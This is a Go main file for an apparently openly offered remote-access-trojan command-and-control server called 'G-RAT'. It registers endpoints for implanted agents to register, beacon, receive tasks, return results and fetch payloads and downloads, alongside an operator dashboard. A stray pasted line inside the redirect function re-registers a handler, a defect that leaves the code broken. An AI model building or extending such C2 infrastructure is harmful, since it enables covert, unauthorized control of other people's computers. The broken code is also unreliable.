package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/sevil11/g-rat/server/api"
	"github.com/sevil11/g-rat/server/core"
	"github.com/sevil11/g-rat/server/web"
)

var (
	port      = flag.String("port", "8080", "Port to listen on")
	logFile   = flag.String("log", "server.log", "Log file path")
	dbFile    = flag.String("db", "agents.db", "Agent database file")
	verbose   = flag.Bool("verbose", true, "Verbose logging")
	version   = "1.0.0"
	startTime = time.Now()
)

func main() {
	flag.Parse()
	
	// Setup logging
	f, err := os.OpenFile(*logFile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Fatalf("Error opening log file: %v", err)
	}
	defer f.Close()
	log.SetOutput(f)
	
	if *verbose {
		log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	}
	
	fmt.Println("╔══════════════════════════════════════════╗")
	fmt.Println("║         G-RAT C2 Server v" + version + "          ║")
	fmt.Println("║     BYOB-inspired Command & Control      ║")
	fmt.Println("╚══════════════════════════════════════════╝")
	
	// Initialize core server components
	if err := core.InitConfig(); err != nil {
		log.Fatalf("Failed to initialize config: %v", err)
	}
	
	if err := core.InitDatabase(*dbFile); err != nil {
		log.Fatalf("Failed to initialize database: %v", err)
	}
	
	// Initialize web interface
	if err := web.Initialize(); err != nil {
		log.Fatalf("Failed to initialize web interface: %v", err)
	}
	
	// Create downloads directory
	os.MkdirAll(filepath.Join("server", "downloads"), 0755)
	
	// Register API handlers
	http.HandleFunc("/api/register", api.HandleRegister)
	http.HandleFunc("/api/task", api.HandleTask)
	http.HandleFunc("/api/result", api.HandleResult)
	http.HandleFunc("/api/beacon", api.HandleBeacon)
	
	// Admin dashboard endpoints
	http.HandleFunc("/", redirectToDashboard)
	http.HandleFunc("/api/agents", api.HandleAgents)
	http.HandleFunc("/api/tasks", api.HandleTasks)
	
	// New API endpoints for dashboard
	http.HandleFunc("/api/server/status", api.HandleServerStatus)
	http.HandleFunc("/api/results", api.HandleTaskResults)
	http.HandleFunc("/api/settings", api.HandleSettings)
	http.HandleFunc("/api/payload", api.HandlePayload)
	
	// Serve downloads
	http.Handle("/downloads/", http.StripPrefix("/downloads/", 
		http.FileServer(http.Dir(filepath.Join("server", "downloads")))))
	
	// Plugin handlers
	for plugin, handler := range api.PluginHandlers {
		path := fmt.Sprintf("/api/plugin/%s", plugin)
		http.HandleFunc(path, handler)
		if *verbose {
			log.Printf("Registered plugin handler: %s", path)
		}
	}
	
	// Start server
	addr := fmt.Sprintf(":%s", *port)
	fmt.Printf("[+] Server started on http://0.0.0.0:%s\n", *port)
	fmt.Printf("[+] Dashboard available at http://localhost:%s/dashboard\n", *port)
	fmt.Printf("[+] Logging to %s\n", *logFile)
	log.Fatal(http.ListenAndServe(addr, nil))
}

// redirectToDashboard redirects the root URL to the dashboard
func redirectToDashboard(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path == "/" {
		http.Redirect(w, r, "/dashboard", http.StatusFound)
		return
	}
	http.NotFound(w, r)
	// Add this line to your route definitions
http.Handle("/downloads/", http.StripPrefix("/downloads/", http.FileServer(http.Dir("server/downloads"))))
}
